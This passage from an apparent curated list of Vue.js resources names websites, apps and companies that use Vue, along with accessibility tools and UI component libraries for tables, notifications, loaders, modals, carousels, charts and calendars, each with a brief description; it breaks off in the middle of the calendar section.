A comparison and ecommerce for OSHC (Overseas Student Health Cover) insurance (Australia's insurance for international students).\nAgiloo - Project Management app for Scrum and Kanban\n\nApps/Websites\n\nLaravel Spark\nVice Video\nFormlets\nLaracasts\nesa.io\n\u7a00\u571f\u6398\u91d1\nPrague Airport\nPortfolio Site\nLaravist\nAtiiv - An app aimed for personal trainers and their clients.\nStatamic\nEmbalses! - A tool to report water dam level using the U.S. Geological Survey database.\nTravelMap - A simple way for travelers to create a blog based on a Map.\nProper Cloth Shirt Builder - Custom shirt builder.\nCheckIt\nReddit News - A browser extension which show notifications and news from reddit.\nPowerpuff Yourself by Cartoon Networks\n\u5c0f\u6843\u9171\ncloudradioo - Web app that plays randomly all top 50 songs from the soundcloud charts\nvNotes - Simple and beautiful notepad to Markdown with Vue.js and Local Storage API.\nOpen Function Computers\nDermail - A webmail client written in Vue.js for Dermail, a mail system written in node.js.\noctimine - A patent search engine.\nDraxed - A web based MySQL and PostgreSQL data browser and dashboard manager.\nLeapspotleap - A simple way to look up wikipedia articles near you. Or simply navigate to a place and find interesting wikipedia information. Responsive web app.\nX-SONGTAO - A Personal blog. FE and CMS are in same vue SPA.\nJobinja - A Job Board and career platform operating in Iran.\n\u6eda\u86cb\u5427\uff01\u8386\u7530\u7cfb - Show all Putian hospital information\nJobi : Recruiting Platform \nThe Spice House - Ecommerce website for high quality spices. Checkout, cart, the product detail page, and search are built using Vue. Checkout is a single page app written with Vue & Vuex.\nLivestorm - Webinar / Live events app.\nMetric Loop - A technology services and solutions website.\nHolden\nGlobal-Exam - Online Training for Language Proficiency Tests\nSlugSurvival - A webapp that helps student better plan their courses (hobby project, not in affiliation with UCSC).\nFreePoll.Online - A group decision making tool built using Vue.js, vue-sortable, Semantic UI and Zappa.\nGitRelease - Track github project's new release on mac menubar using vue.js with electron.\n12BAY.VN - Applications online flight bookings.\nPLAYCODE.IO - Playground for Rapid Frontend Experiments.\nThe Void Radio - Underground House Music Online Radio.\nBitly Vue - Shorten URLs with VueJS & Bitly API.\nStoryblok - API Based/Decoupled CMS using VueJS for its frontend.\nWizzAir\nMoving to HTTPS - Guide to moving different platform/hosting sites to HTTPS\nBooknshelf - Discover great books and bookshelves on different topics.\nTop HN - A real time display of top news activity on Hacker News\nEuronews - Euronews is a multilingual news media service, headquartered in Lyon, France.\nRoozame \u0631\u0648\u0632\u0627\u0645\u0647\ufffd - Roozame is a Persian smart news media service.\nKoumoul\nNinjaCalc - A suite of embedded engineering related calculators, built as an open-source single-page app with vue.js.\nVue.js Feed - The latest Vue.js news, tutorials, plugins, and more. Made with Vue.js and Laravel, based on Vuedo.\n\u849c\u74e3 - A web app developed with Vue2.0 and Douban API\nGuess Right - A 'guess the word' game - Written with Vue/vuex/vue-router (front-end) and Laravel/MySQL (back-end). Code is Open Source on GitHub (although not the live files that run the game at kdcinfo).\nGRAP - Business communication service\nEasy Mock\nmmf-blog-vue2-ssr A blog built with Vue 2.0, vue-router & vuex, with server-side rendering\nJSON Schema Editor - An intuitive editor for JSON schema built with Vue.js and Firebase.\nWinsome Trivia - A single or multiplayer trivia game featuring over 2,000 unique questions built with Vue.js and powered by the Open Trivia Database.\nMoon Organizer - Lunar calendar app\nFlash-Vue - \u2018Flashcards of the Future\u2019 bring learning everywhere \ud83d\ude80\nKinderbesteck - A full Online Shop SPA with Vue2.0, Vuex, Vue Router\nn2ex - A vue ssr(nust) website, use v2ex API\nPower Thesaurus - A crowdsourced online thesaurus\nChattanosy - A community-powered database of new things and places in Chattanooga, TN.\nPAIXIN - A genuine picture sale website\nCodeBottle - Drag-and-drop snippets to your projects\n1XBET - A betting company operating since 2007\nMyOwnTV - A streaming website for creating internet television\nCrowdCircus - Europe\u2019s biggest crowdfunding- and crowdinvesting-aggregator\nTalk to Someone - Free, anonymous and confidential online text chat with strangers around the world.\n\u8f6e\u5b50\u5de5\u5382 - A ui components and libraries sharing website\n\u0627\u0628\u06cc\u0627\u062a \u0646\u0627\u0628 \u067e\u0627\u0631\u0633\u06cc - A collection of Persian poems\nRipplectron - Ripple(Blockchain coin) Wallet Desktop client for vue-electron\nPingBreak A free and simple website monitoring service using vuejs for real-time dashboard\nTodoist Tribute - Todoist clone, written in Rails + Vue\nJSON Editor - A schema-aware JSON editor built with Vue2 and firebase.\nDevelteam - A social network for indie game developers.\nMixsii - A free video chat room site for teens, adults, family, and friends.\nPipQuest - A retro-style puzzle game built in Vue\nMatryx - A decentralized collaboration platform.\niPrevYou - YouTube\u2122 Player - A chrome app for watching youtube videos on your desktop.\nItem Manager - An application to transfer items for Destiny 2 game.\nFrontend Masters Intro to Vue - Frontend Masters full day course\nTR-101 - A drum synth / sequencer.\nBazaar - Media sharing platform.\nWynnStats - A unofficial WynnCraft statistics.\nVectr - A free vector graphics software\nbrain bits - A P300 online spelling mechanism for Emotiv headsets\nCoin Dashboard - The fully client-side cryptocurrency asset dashboard.\nHabitica - online task management application in  the form of a role-playing game.\nMadeWithVueJs - A Gallery of Projects made with Vue.js (also the Site itself uses Vue.js)\nCodeDependencyScanner - A C# dektop application that display .Net assembly code dependencies build with Vue, Neutronium and D3.js.\nThousand Ether Homepage - The Million Dollar Homepage reimagined as an Ethereum DApp. Build on Vue.js and open source.\nLet's Enchance - free online image upscale and enhancement with neural networks.\nPi.TEAM - Online Invoicing and Accounting - Simple to use online accounting and invoicing, free for single users and freelancers.\nVuethwallet - A simple app generate ethereum wallet with vuejs.\nTipe - Next Generation API-first CMS. Create your content with powerful editing tools and access it from anywhere with a GraphQL or REST API. Stop letting your CMS decide how you build your apps.\nVuethexplore - A simple app explore ethereum blockchain with vuejs.\nFintechers - Fintech focused job board.\nDevjournal - Collaborative todo list for projects and ideas.\nBubbleflat - Online platform that helps students and young Professionals find their perfect roommates by searching for people with similar lifestyles, interests, or schools. Laravel & Vuejs\nTeaQuinox Tea Co -- ecommerce site that specializes in loose leaf tea.\nblip - Test websites for speed, mobile-friendliness, security and the HTML5 doctype. Find businesses around a location and test their websites en masse, or just test your own URL.\nsunpos - Sun position, elevation, azimuth, ecliptic/equatorial coordinates and sunrise/sunset time (Julian day) calculation and conversion utilities. Web site is programmed using pure JS, Vuejs and i18n Vuejs localization plugin. Visualization is created using D3.js.\nU3xyz - A personal blog base on vue ssr.\n27.ua - Ukraine-based internet hypermarket\nChess Guardian - Answer chess positional questions from your own games.\nBlackjack Break - A quick game of blackjack\nMECHANICAL - Reddit mod for Firefox that surfaces contextual data insights.\nGameVix - Swap your used video game discs with others, hassle free. PWA with Material Design.\nVivifyScrum - Agile project management app for teams that deliver. Customizable Scrum and Kanban boards.\n9GAG - Popular online platform and social media website\nCryptoVue - Real-time cryptocurrency dashboard\nKitchen Stories - Cooking platform\nMailRabbit - Create, A/B test, and monitor transactional emails without a developer.\nVue\u8d44\u6e90\u7cbe\u9009 - great Vue components list, category, inline demo show and brief\nCronhub - Painless Cron Monitoring Tool\nwrkprty - Pop-up coworking events for freelancers, remote workers, and professionals looking to get out of the office.\nMade with love - The Made with Love \u2764\ufe0f around the world, initiative is a movement to celebrate \ud83c\udf89, promote \ud83d\udce3 and build a brand \ud83d\udc51. It feed Tech news, design inspiration and trends from over \ud83d\udcaf sources including Dribbble, ProductHunt, Behance and Techcrunch. \ud83d\udc9d\nPath to Product - Discover over 1,000 product jobs at startups and tech companies.\nV\u00b7oogle - Google.com, reVued. A joke-project. :)\nBroker Notes - 'Study to become a Real Estate Agent' \ud83c\udfe0\nSyncLounge - SyncLounge is a tool to sync Plex content across multiple players in multiple locations.\nHCE.it - The website of an Italian agency, entirely made with Vue using a Laravel-based headless CMS.\nPages - Web design inspiration\nScrumpy - A Beautiful Project Management Tool for Agile Teams\nSpektrum - The website of Spektrum Media Agency\nSPK The website of SPK Ecosystem\nIDDEF \u262a\ufe0f The Federation of the Associations that Value Humanity's webpage, CMS, CRM and Donation and all e-commerce pages are designed with Vue.js, Vuex and pure JavaScript \ud83d\ude4f\nConfiguration File Management - A simple way to manage your configuration files\nRoast an app built to help coffee enthusiasts find their next cup of coffee while learning about Laravel + Vue.js.\nYBR - Centralized YBS Public eComplaint Management System. (Full SPA)\nRegex Fiddler\nMyanpwel - The website of event ticketing platform.\nCryptoArte - An Ethereum art collection, non-fungible token, and Dapp.\nMuuviez - A movie discovery and tracking website with stylish design\nNAGA VIRTUAL - NAGA VIRTUAL is the first independent virtual goods market.\nScroll.in - Scroll.in is an independent news, information, and entertainment venture.\nAkunyi - Charity Website\nWhat Would Mark Ruffalo Do? - Motivational website based on the story that Mark Ruffalo failed at several hundred auditions before finding success.\nBrandy - brand assets manager for your menu bar.\nRuster\u793e\u533a - Rust fullstack community forum for CN.\nNBC Sports - NBC Sports is a sports news website.\nWITHIN - Extraordinary stories in Virtual Reality.\nplottr.io - Plan your running and cycling routes\nbeCamp - A community-organized tech conference in Charlottesville, VA. Website code is open-source.\nTrustpilot - a free and open to all review platform.\nLagom - Simple, intuitive and fully responsive WHMCS theme\nScoutMyTrip - Roadtrip Planner - Road trip planning app for India which helps travelers to build their itinerary, discover points of interest, find hotels, gas stations, food joints etc along the route.\nPodflix - Podcast app.\nGamersClub - Biggest company of eSport community development in Brazil\nMIT - Official Website of Massachusetts Institute of Technology.\nElvenar - Elvenar is a browser based fantasy city builder game.\nBeacon - \ud83d\udc99 A service that allows you to share your content across multiple websites.\nArtfinder - Artfinder is a website for buying & selling art paintings.\nRolodromo - A spanish website dedicated to tabletop RPG.\nGitHubExplorer - Pure static page webapp for exploring GitHub. Using Vuejs and GitHub GraphQL API v4.\nKeynote - Present with Vue.\nHappyPlants - A progressive web app for organizing your plants \ud83c\udf31.\nPocket Lists - World's friendliest to-do list app.\nPadlet - Collaborative bulletin boards\nGlovo - On-demand delivery\nMySigMail - MySigMail is a free, in browser, email signature generator without creating account\nWordguru - A simple verbal game where you split into teams and try to guess as many keywords as you can.\nApiFlash - A Chrome based screenshot API built on top of AWS Lambda for Developers\nKitty Ipsum - Generate lorem ipsum composed of \"meow\" in different languages.\nGit Superstar - Count your git stars and top repositories.\nDECS - The decentralised all-in-one workspace to manage code snippets and to protect sensitive data.\nCareup - Business management tool for dentists \ud83e\uddb7.\nAsciiur - Internet's ascii art collection\nTapestri Designer - Free tool to design PCR primers for genome sequencing experiments (NGS)\nRemote-Access-SSH - Web based remote host access with node-ssh\nMap Marker Generator - A Free Online Tool To Generate Custom Map Icons On The Fly\nMonocle Reader - Follow feeds, Twitter, YouTube, Blogs and everything else, all in one place.\n\u524d\u7ad9\u5bfc\u822a - \u524d\u7aef\u793e\u533a\u3001\u6587\u6863\u6536\u5f55.\nGeenes - Generate and apply color palettes to your UI, then export it to sketch or code.\nBlurrish - Encrypted Morning Pages journal for Mac/Windows, built with Vue and Electron. Blurs as you write so you can journal in public workspaces.\nExifShot - What and how on photography, beautifully.\nStudolog - Online file sharing platform for students, including tester and reviews. Currently in Czech \ud83c\udde8\ud83c\uddff only.\n\nInteractive Experiences\n\nJean-Pierre Morin | 1700 LAPOSTE\nFacebook NewsFeed\nYouTube AdBlitz 2016\nOmnisense Experience\nLouis Ansa Website (portfolio)\nDjeco.com\nTolks.io\nMeet Graham\nNOIZE original\nTR-101 Synth Drum Machine\nBootstrap 4 Editor\nSubtletab - Browser Extension\nweb-riimote - Turn your smartphone into a 3D controller (source code)\nCSS ColorVars - Interactive tool code generation (source code)\n\nEnterprise Usage\n\nAlibaba\nBaidu\nSina Weibo\nXiaomi\nEle.me\nOptimizely\nExpedia\nUCWeb\nLine\nNintendo\nCeltra\nSainsbury's\nAREX\nDJI\nOctimine GmbH\nHunliji\nGitLab\nClemenger BBDO Melbourne\nZenMate\nCodeship\nStoryblok\nMonito - Building the Booking.com for international money transfers\nHypefactors - Software for data-driven PR professionals\nAdobe\nIBM\nCotabox\n\nA11y\n\nVue A11y project - Vue.js community project to improve web accessibility.\nvue-skip-to - It helps people who only use the keyboard to jump to what matters most.\nvue-axe - Accessibility auditing for Vue.js applications.\nvue-announcer - A simple way with Vue to announce any useful information for screen readers.\neslint-plugin-vue-a11y - Static AST checker for accessibility rules on elements in .vue\nvue-focus-lock - It is a trap! A lock for a Focus. A11y util for scoping a focus.\nvue-a11y-calendar - Accessible, internationalized Vue calendar.\n\nComponents & Libraries\nUI Components\nTable\nTables / data grids\n\nvuetable-2 - Data table simplify.\nvue-tables-2 - Vue.js 2 grid components.\nvue-datasource - A vue.js server side component to create dynamic tables.\nag-grid-vue - Vue adaptor for ag-Grid.\nvue-data-tables - Vue2.0 DataTables, based on element-ui.\nvue-floatThead - Vue 2.0 component for floatThead, a floating & sticky table header plugin.\nvuetiful-datatable - Datatable component with sorting, filtering, pagination, grouping and aggregation.\nvue-materialize-datatable - VueJS datatable for Materialize CSS\nvue-good-table - An easy to use, VueJS (2.x) table plugin with sorting, column filtering, pagination etc.\nvue-grid - A flexible grid component for Vue.js\nvue-easytable - A powerful table components based on Vue2.x\nvue2-datatable-component - The best Datatable for Vue.js 2.x which never sucks\nvue-js-grid - Vue.js 2.x responsive grid system with smooth sorting, drag-n-drop and reordering\nvue-handsontable-official A Vue.js wrapper for the Handsontable spreadsheet component\nvue-grid - A powerful flexbox grid system for Vue.js 2.x, built with inline-styles\nvue-data-tablee - Based on vue-good-table, a simple and pretty table component\nvue-scrolling-table - Simple table component with flexbox sizing, scrolled table body (horizontal and vertical), slots for all tr/th/td rendering.\nel-search-table-pagination - Combines Form, Table and Pagination components of Element UI together. Based on Vue 2.x.(Detail)\nvue-crud-x - Extensible crud component using Vuetify layout, other than the usual page, sort, filter, it is able to do nested CRUD, custom forms, filters, operations.\nVue Datatable - VueJS powered Datatable with Laravel server-side loading and JSON template setup\nv2-table - A simple table component based Vue 2.x.\nvue-cheetah-grid - A high-performance grid engine that work on a canvas for Vue.js.\nvue-table-component - A straight to the point Vue component to display tables.\n@lossendae/vue-table - Simple table component for Vue.js 2.x with pagination and sortable columns.\nel-data-table - base on element-ui, makes crud easily\nDevExtreme Vue Grid - High-performance plugin-based Vue data grid for Bootstrap.\nvue-ads-table-tree - A vue Table component, with filtering, sorting and pagination. Rows can have child rows, so a tree structure can be build. It also supports async calls to load rows from the backend. It's built with the css framework tailwindcss\nSyncfusion Data Grid for Vue - Displays and manipulates tabular data with features such as paging, sorting, filtering, editing, and grouping.\n@marketconnect/vue-pivot-table - A vue component for pivot table\nvue-teible - Lightweight and flexible table component for the web \u26a1\ufe0f\nvue-jqxgrid - Vue data grid with filtering, sorting, editing, grouping, data export and other features.\nvue-jqxpivotgrid - Vue pivot data grid with pivot designer, drill through cells, pivot functions.\ntoast-ui.vue-grid - Vue Wrapper for TOAST UI Grid.\nvueye-datatable - Vueye data table is a responsive data table component based on Vue.js 2, it organizes your data per pages in order to navigate easily.\nvue-sorted-table - A plugin to turn tables into sorted tables. Supports nested object keys, custom icons and reusable components.\nvue-bootstrap4-table - An advanced data table based on Vue 2 and Bootstrap 4, which includes Multi column filtering, Multi column sorting, Pagination & Info, Checkbox rows and Highly customizable slot options.\nvuejs-smart-table - Straight Forward Table Component using the vanilla HTML Table Structure with Sorting, Filtering, Pagination and Selection out of the box.\n@myena/vue-table - Table Components for Client/Server data handling. Filter, sort, paginate, group, expanding details row. Highly customizible via slots for filter, headers, column, pagination, details row.\n\nNotification\nToaster / snackbar \u2014 Notify the user with a modeless temporary little popup\n\nvue-notifications - Vue.js agnostic non-blocking notifications library.\nvue-easy-toast - A toast plugin for vue/vue2.\nvue-toasted - Responsive Touch Compatible Toast plugin for VueJS.\nvue-notifikation - Vue.js notification plugin.\nvue-notification - Vue.js 2+ notification plugin using Velocity for animations.\nvs-notify - Tiny but powerful notification component with no dependencies.\nvue2-notify - Vue.js 2+ notification plugin.\nvue-notifyjs - Minimalist, 3kb themable notification plugin\nvueup - Simple, lightweight and elegant global notification popup for Vue.js\nvuex-flash - Flash message component for VueJS 2.x within Vuex 2.x.\nvue-snotify - Vue.js 2 Notification Center\nvue-notify-me - Stackable notification Alert for Vue\nvue-noty - A Vue.js 2 wrapper around Noty\nvue-notice - Vue.js 2 wrapper around Noty.js with native API\nvue-flash-message - Simple yet flexible notification plugin\n@voerro/vue-notifications - Simple Vue.js 2 notifications plugin with HTML and styling support.\nvue-awesome-notifications - Lightweight Vue.js notification library with advanced async support.\nvue-izitoast - A Vue.js 2 wrapper around IziToast.\nvue-toastr-2 - Simple toast notifications for Vue.js built on toastr\nvue-snack - A Vue.JS plugin for Snackbars based on Google Material.\nvue-m-message - A message plugin for vue.\nvue-notification-bell - A Vue UI component for showing notifications.\nv-tostini - Really plain toast notifications mechanism for Vue.js 2.x. No CSS included.\n\nLoader\nLoaders / spinners / progress bars \u2014 Let the user know that something is loading\n\nvue-radial-progress - Radial progress bar component for Vue.js.\nvue-simple-spinner - A simple, flexible spinner for Vue.js\nvue-wait - Complex Loader Management for Vue/Vuex and Nuxt applications.\nvue-spinner-component - Customizable, lightweight spinner for Vue.js.\nvue-progress-path - Customizable progress indicators and spinners that support any custom SVG path.\nvue-blockui - BlockUI for vue 2, similar to jquery blockUI, can be used for loading screen.\nepic-spinners - Easy to use css spinners collection with vue.js integration.\nsvg-progress-bar - A simple progress bar for Vue.js.\nvue-loading-overlay - Tiny full screen loading indicator\nvue-loaders - vue wrappers for loaders.css\nvue-promise-btn - Tiny and powerful tool for asynchronous buttons(or any other tag) lock with fancy built-in spinner\nvue-spinkit - \ud83c\udf08 A collection of loading indicators animated with CSS for VueJS\nvue2-form-loading - A VueJS directive can be used with forms in order to disable submit button while the next page is loading\nvue-element-loading - \u23f3 Loading inside a container or full screen for Vue.js\ntb-skeleton - A skeleton screen loading for Vue.js\nvue-spinners - \ud83d\udcab A collection of loading spinner components for Vuejs\nvue-progress-bar - This is a cascading progress bar plugin based on vue\nvue-loading-button - \ud83d\udc47 Straightforward button with slideout loading indicator\n\nProgress Bar\nA slim progress bar at the top of the page\n\nvue-progressbar - A lightweight progress bar for vue.\nvue2-loading-bar - Simplest Youtube Like Loading Bar Component For Vue 2.\nvue-top-progress - Yet another top progress loading bar component for Vue.js.\nvue-nprogress - Progress bars is based on nprogress for Vue.\nvue-progress-button - Vue.js 2.x animated button component.\nvue-simple-progress - A simple, flexible progress bar for Vue.js\nvue-component-loading - Manage a loading state inside each component and display the global loading state with a progressbar.\nvue-scroll-progress - Simple Vue.js plugin for page scroll progress bar\nvue-read-progress - Customizable progress bar at the top of the page that shows the scroll progress\n\nTooltip\nTooltips / popovers\n\nv-tooltip - Easy tooltips with Vue 2.x.\nvue-popper-component - Popper.js directive for Vue.js.\nvue-directive-tooltip - Simple, flexible tooltip directive (based on Popper.js) \nvue-popperjs - VueJS 2.x popover component based popper.js\nvue-tooltipster - VueJS 2.x tooltip component based tooltipster.js. Support html content, hover and hover+click events.\n\nOverlay\nOverlay / modal / alert / dialog / lightbox / popup\n\nvuedals - A VueJS (2.x) Plugin for multiple modals windows with a single component instance.\nsweet-modal-vue - The sweetest library to happen to modals. Now available for Vue.js.\nvue-js-modal - Simple to use, highly customizable, mobile friendly Vue.js 2.0+ modal with 0 dependencies.\nvudal - Modal window for vue.js\nvodal - A vue modal with animations.\nvue-image-lightbox - A Vue image lightbox/gallery to display images nicely.\nvue2-simplert - Vue 2 Simple Alert Component (SweetAlert Inspired) By Irfan Maulana\nVue-Semantic-Modal - Vue 2 Semantic-UI modal component without jQuery dependency\nv-img - Easy to install image gallery.\nvue-dialog-drag - Draggable dialog\nvue-ya-semantic-modal - Yet another semantic-ui modal component for Vue2 without Jquery but with Vue transition\nvue-pure-lightbox - Very simple lightbox plugin without any dependencies - only Vue! \ud83d\uddbc\nv-viewer - Image viewer component for vue, supports rotation, scale, zoom and so on, based on viewer.js\nvue-messagebox - Easy and made-to-order messagebox component on Vue.\nvuejs-dialog - A lightweight, promise based alert, prompt and confirm dialog.\n@hscmap/vue-window - Window UI Component for vue2.\nvue-gallery - VueJS responsive and customizable image and video gallery, carousel and lightbox, optimized for both mobile and desktop web browsers. Based on blueimp-gallery\nvue-swal - A small wrapper for integrating SweetAlert to Vuejs. (Compatible with SSR)\nvue-modal-dialogs - \u2728 Promisify your own dialogs!\nvue-img-view - a plugin for Vue.js, you can drag / view / rotate pictures anywhere\nvue-modaltor - most advance configurable modal component for vuejs\nv-modal-backdrop - A simple generic backdrop component for vue\nvue-cute-modal - A simple and easy to use Modal component for Vue applications.\nv-dialogs - A simple and powerful dialog, including Modal, Alert, Mask and Toast modes, based on Vue2.x\nvue-gallery-slideshow - Responsive gallery component for VueJS\nvue-a11y-dialog - A Vue.js component wrapper for the accessible dialog a11y-dialog.\nvue-slideout-panel - Stackable panel component for VueJS\nv-gallery - A Vue2 plugin for images show in gallery or carousel\nvue2-image-loader - A image lazyLoad loader component for vue2\nvue-my-photos - A simple dependency-free image lightbox component with filtering capabilities\nvue-img-orientation-changer - A Vue.js directive that automatically adjust your img to correct orientation.\nvue-topmodal - A fully customisable, easy to use, Vue.js modal component. (Responsive, Stackable, Scrollable, Animated)\nvue-modal \ud83d\uddbc - Feed your objects array for multiple switchable modal content or quickly inline your content. A fully customisable vue modal component .\n\nParallax\n\nvue-parallax - Scrolls an image slower than the window to create a neat optical effect.\nvue-parallaxy - Vue.js component for parallax image scroll effects.\nvue-mouse-parallax - A simple to use Mouse Parallax Component - Made with Vue.js\nvue-parallax-js - Tiny vue component that adds a directive for parallax effect on elements.\n\nIcons\n\nvue-awesome - Font Awesome component for Vue.js, using inline SVG.\nvue-material-design-icons - A collection of SVG Material Design icons as single file components.\nvue-icon-font - A iconfont plugin for Vuejs (support Font-class and Symbol).\nvue-ionicons - Vue Icon Set Components from Ionic Team.\nvue-ico - Dead easy icons for Vue with drop-in browser support & selective bundling\nmdi-vue - Material Design Icon components for Vuejs\nvue-fontawesome - Font Awesome 5 Vue component\ng-icon - Simple icon component for your svg icons (compatible with Font Awesome-like font toolkits)\nvue-simple-line-icons - Simple Line Icons component for Vuejs\nvue-country-flag - Vue component for country flag icons - vicon - Vicon is an simple iconfont component for vue.\nmd-svg-vue - Material Design Icons by Google for Vue.js & Nuxt.js (server side support (with caching), inline svg rendering, official icon names)\nvue-lang-code-flags - Vue component which shows the flag of the country from which the language comes from\nvue-zondicons - Vue component for the beautiful Zondicon svg icons\nvue-eva-icons - Simply beautiful open source eva icons as Vue components.\nvue-unicons - 1000+ Pixel-perfect svg unicons for your next project as Vue components.\nvue-fa - Simple FontAwesome 5 Vue.js 2 component.\nvue-cryptoicon - Beautiful pixel perfect 400+ cryptocurrency and 10+ Fiat currency icon.\n\nMenu\n\nvue-accordion - Simple accordion nav menu component for Vue.js.\nvue-js-dropdown - Vue.js 2 dropdown menu component. Light, easy to use and extend, no external deps.\nvue-slideout - Vue implementation of the popular library slideout\nvue-quick-menu - This is web navigation component base on vue.js2.\n@hscmap/vue-menu - Menu / Context Menu component for vue2.\nvue-router-nav - Minimalistic responsive navigation bar that renders routes of vue-router.\nvue-drawer-layout - A simple DrawerLayout component like Android has for Vue.js.\nvue-simple-menu - Simple menu component with a set of basic functionality, which is enought in 80% of cases\nvue-tree-navigation - Vue.js 2 tree navigation with vue-router support\nbp-vuejs-dropdown - Vuejs => 2 dropdown. Easy to use, no external, optional.\nvue-bulma-accordion - Simple, easily configurable accordion or collapsible styled with Bulma custom or built in icons available\nv-selectmenu - A simple, easier and highly customized menu solution for Vue2.\nvue-burger-menu - An off-canvas sidebar Menu component with different CSS animations.\nvue-dynamic-dropdown - A Highly Customizable, easy-to-use elegant dropdown component\nvue-navigation-bar - A simple, pretty navbar for your Vue projects.\n\nMinus Plus Input\n\nminus-plus-input - A number input with plus minus; included for Vue.js v1 and v2.\nvue-integer-plusminus - Integer input with increment and decrement buttons for vue 2.\nvue-numeric-input - Number input component with controls.\n\nCarousel\n\nvue-easy-slider - Slider Component of Vue.js.\nvue-l-carousel - A responsive carousel(namely slider or swiper) component for Vue.js v2.x+.\nvue-awesome-swiper - Swiper(slide) component for Vue.js(1.x ~ 2.x).\nvue-lory - Vue Slider Component based on lory.\nvue-slick - Vue component for Slick-carousel.\nvue-flickity - A Vue Component for Flickity.js.\nvue-carousel-3d - Vue Carousel 3D - Beautiful, flexible and touch supported 3D Carousel for Vue.js.\nvue-carousel - A flexible, responsive, touch-friendly carousel for Vue.js.\nvue-coverflow - A vue2.x coverflow component.\nvue-agile \u2013 A carousel component inspired by Slick, written in Vue.js and vanilla JS only.\nvue-tiny-slider \u2013 A carousel component created by ganlanyuan, written in Vue.js. No jQuery. Works in IE8+.\nvue2-text-swimlane - A Text Swimlane plugin for Vue.js\nvue-picture-swipe - Vue Picture Swipe Gallery (a gallery of image with thumbnails, lazy-load and swipe) backed by photoswipe.\nvue2-siema - Plugin wrapper for the very tiny Siema carousel/slider library.\nvue-flux - Image slider which comes with 20 cool transitions.\nvue-glide - Vue slider & carousel component on top of the Glide.js\nvue-owl-carousel - Vue component for Owl Carousel 2\nvueper-slides - A touch ready and responsive slideshow / carousel for Vue JS.\nvue-canvas-carousel - Vue canvas component for vuc-carousel\nHooper - Customizable accessible carousel slider optimized for Vue\n\nCharts\n\nvue-morris - VueJS component wrapping Morris.js.\nvue-charts - Google Charts plugin for Vue.js.\nvue-chartjs - Vue.js wrapper for Chart.js.\nhchs-vue-charts - Based on Vue2.0 wrapper for ChartJs.\nvue-echarts - ECharts component for Vue.js.\nvuetrend - Simple, elegant spark lines for Vue.js.\nvue-highcharts - Highcharts component for Vue.\nvue-echarts-v3 - Vue.js(v2.x+) component wrap for ECharts.js(v3.x+).\nvue-chartist - Vue.js 2.0 component wrap for Chartist.\ng2-vue - Factory wrapper for using G2 easily in a Vue Component.\nvuebars - Simple, elegant spark bars for Vue.js.\nvue-d3-network - Vue component to graph networks using d3-force\nvue2vis - Vue2 wrapper for Visjs.\nvue-c3 - A reusable vue component for c3 charts\nvue-d2b - Vue components for d2b charts. (Including axis, pie, sankey, and sunburst charts)\nVueChart - A very simple Vue wrapper for Chart.\nvue-chartkick - Create beautiful JavaScript charts with one line of Vue\nd3vue - A D3 Plugin for Creating Reactive Data Visualizations in VueJS\nvue2-frappe - A simple wrapper around Frappe Charts for VueJS\nvue-google-charts - Reactive Vue.js wrapper for Google Charts lib\nvue-graph - Data visualization library for dashboard implementation in Vue.js\nvue.d3.sunburst - Reactive sunburst component based on D3.js\nv-chart-plugin - A customizable component for adding D3 charts that binds to your components data.\nvue-jqxchart - Charting component with Pie, Bubble, Donut, Line, Bar, Column, Area, Waterfall, Polar & Spider series.\ntoast-ui.vue-chart - Vue Wrapper for TOAST UI Chart.\nvue-apexcharts - Vue.js component for ApexCharts.\nvue-doughnut-chart - Doughnut chart component for Vue.js.\nv-charts - Chart components based on Vue2.x and Echarts.\nvue-css-donut-chart - Lightweight Vue component for drawing pure CSS donut charts.\nvue-trend-chart - Simple trend charts for Vue.js\nvueplotlib - Declarative, interactive, linked plot components\nvgauge - A Vue Wrapper to GaugeJS - Create beautiful gauges\nvue-plotly - Wrapper for plotly.js declarative charting library that ships with 20 chart types, including 3D charts, statistical graphs, and SVG maps.\nvue-funnel-graph-js - Funnel graph drawing library for Vue.js. Create vertical and horizontal animated SVG funnel charts and add labels, values, legend and other info.\n\nTime\nDisplay time / date / age\n\nvue-timeago - A tiny timeago component for Vue.\nvue-moment-jalaali - Jalaali Moment.js filters for your Vue.js project.\nvue-countdown-timer - Added timezone conversion support.\nvue-analog-clock-range - Analog clock range to show time difference.\nvue-moment-lib - A simple Vue.js 2.0 MomentJS library (filters & globals) using the same momentjs API.\nvuejs-countdown - A simple countdown timer component for vue js 2.0\nvue2-flip-countdown - A countdown timer with flip effect for Vue 2.x\ntimeline-vuejs - A minimalist timeline for Vue\nvue-awesome-countdown - Countdown plug-in with high performance and high accuracy for Vue 2.5.0+. Official site: https://vac.js.org\nvue-clock2 - Display clock component for Vue.\nvuemodoro - Pomodoro timer as single file Vue component.\n\nCalendar\nDisplay non-editable events in a Calendar\n\nvue-fullcalendar - Vue calendar fullCalendar. No jQuery required. Schedule events management.\nvue-event-calendar - A simple events calendar for Vue2, no dependencies except Vue2.\nvue-calendar-picker - Lightweight calendar component for events display, period selection and date picker.\nvue-lunar-calendar - A vue component for lunar calendar. Uses Moment.js for date operations.\nvue-simple-calendar - Flexbox-based Vue month calendar compenent; supports multi-day events, localization, holiday emoji, drag/drop. No dependencies.\nvue2-calendar - A simple full calendar component aimed at being flexibile and lightweight.\nvue-jlunar-datepicker - A Chinese lunar datepicker component with festivals and solar terms.\nvue-full-calendar - A complete fullcalendar.io wrapper for both Vue 1 and 2\nv-calendar - Animated calendar/datepicker that displays regions, indicators and day popovers for simple & recurring dates.\nvue-infinite-calendar - A simple infinite calendar implementation for Vue 2\nvue-calendar - A simple calendar components for Vue 2.1.5+, support custom content. No dependencies.\nvue2-event-calendar - An events calendar for Vue2, support customize event items and calendar header.\nvue2-datePicker-infinite - An infinite datePicker for Vue2, easy to use and no dependencies.\nvue2-slot-calendar - A vue 2 calendar, datepicker component which supported lunar or date event, bootstrap style.\nquasar-calendar - A vue.js calendar using the Quasar framework that implements monthly, multi-day and agenda views.\nvue2-datepicker - A beautiful datepicker / datetimepicker component for Vue2\nvue-pikaday - VueJS wrapper component for Pikaday datepicker\nvue-tuicalendar - VueJS wrapper component for tui.calendar calendar\nvue-jqxscheduler - VueJS Scheduler component.\ntoast-ui.vue-calendar - Vue Wrapper for TOAST UI Calendar.\nvue-functional-calendar - Lightweight, high performance calendar component(Date Picker, Date Range) based on Vue.\nvue-cal - A Vue JS full calendar, no dependency, no BS. \ud83e\udd18.\nvue-draggableCal - Not your ordinary datepicker. A Vuejs draggable date selector with a fresh responsive design, mobile ready and 0 dependencies, 17kb gzipped\nvue-material-year-calendar -  A full year (12 months on a page) calendar 